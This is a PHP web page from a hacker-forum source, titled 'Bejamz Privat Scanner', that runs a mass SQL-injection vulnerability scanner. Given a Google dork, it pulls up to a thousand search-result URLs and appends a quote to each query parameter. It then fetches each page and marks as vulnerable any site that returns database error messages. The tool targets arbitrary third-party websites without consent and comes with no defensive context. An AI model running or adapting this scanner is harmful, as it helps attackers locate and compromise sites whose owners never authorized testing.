<html>
<head>
<title>||== SQLI Scaner ==||</title>
<style>
body{
background: #0F0F0F;
color: #FFFFFF;
font-family:  monospace;
font-size: 12px;
}

input{
background: #0F0F0F;
border: 1px solid #00FF00;
color: #00FF00;
}

h2{
color: #55FF2A;
}

a{ color: #5A5A5A; text-decoration: none; }
a:visited, a:active{ color: #5A5A5A; text-decoration: line-through; }
a:hover{ color: #00FF00; text-decoration: line-through; }
.effectok:hover { text-decoration: underline; }
.effectfalse:hover { text-decoration: line-through; }
</style>
</head>
<body>
<p align="center">
<?php
echo "<h2>Bejamz Privat Scanner</h2>";
echo "<form action='' method='post'>";
echo "<b>Dork</b>: <p><input type='text' name='dork' value='inurl:news.php?id='></p>";
echo "<input type='submit' value='Search'>";
echo "<hr><br />";
if($_POST['dork']) {
@set_time_limit(0);
@error_reporting(0);
@ignore_user_abort(true);
ini_set('memory_limit', '128M');

$google = "http://www.google.com/cse?cx=013269018370076798483%3Awdba3dlnxqm&q=REPLACE_DORK&num=100&hl=en&as_qdr=all&start=REPLACE_START&sa=N";

$i = 0;
$a = 0;
$b = 0;
while($b <= 900) {
$a = 0;
flush(); ob_flush();
echo "Pages: [ $b ]<br />";
echo "Dork: [ <b>".$_POST['dork']."</b> ]<br />";
echo "Getting result from google...<br />";
flush(); ob_flush();

preg_match_all("/<h2 class=(.*?)><a href=\"(.*?)\" class=(.*?)>/", Connect_Host(str_replace(array("REPLACE_DORK", "REPLACE_START"), array("".$_POST['dork']."", "$b"), $google)), $sites);
echo "Scanning...<br />";
flush(); ob_flush();    while(9) {
if(preg_match("/You have an error in your SQL','Division by zero in|supplied argument is not a valid MySQL result resource in|Call to a member function','Microsoft JET Database|ODBC Microsoft Access Driver|Microsoft OLE DB Provider for SQL Server|Unclosed quotation mark|Microsoft OLE DB Provider for Oracle|Incorrect syntax near|SQL query failed/", Connect_Host(str_replace("=", "='", $sites[2][$a])))) {
echo "<a href='".Clean(str_replace("=", "='", $sites[2][$a]))."' target='_blank' class='effectok'>".str_replace("=", "='", $sites[2][$a])."</a> <== <font color='green'>SQL Injection vulnerable</font><br />";
} else {
echo "<a href='".Clean(str_replace("=", "='", $sites[2][$a]))."' target='_blank' class='effectfalse'>".str_replace("=", "='", $sites[2][$a])."</a> <== <font color='red'>Failed</font><br />";
flush(); ob_flush();
}
if($a > count($sites[2])-1) {
echo "Done<br />";
break;
}
$a = $a+1;
}
$b = $b+100;
}
}
function Connect_Host($url) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$data = curl_exec($ch);
if($data) {
return $data;
} else {
return 0;
}
}
function Clean($text) {
return htmlspecialchars($text, ENT_QUOTES);
}
?>
</p>
<p align="center">Dedicated To :</p>
<p align="center">||Vodkadelisfuck||Hexadecimal||ArRay||N4is3n||Gt_Portnoy||Rinowengi||Gblack|| ​</p>
<p align="center">||== Hacker-Newbie.org ==||</p>
<p align="center">Contact inbox@bejamz.us This e-mail address is being protected from spambots. You need JavaScript enabled to view it </p>
</body>
<center><font color=00FF00><script type="text/javascript" src="http://st1.freeonlineusers.com/on3.php?id=172058"> </script>Yang Lagi Nyecan</font></a></center>
</html>
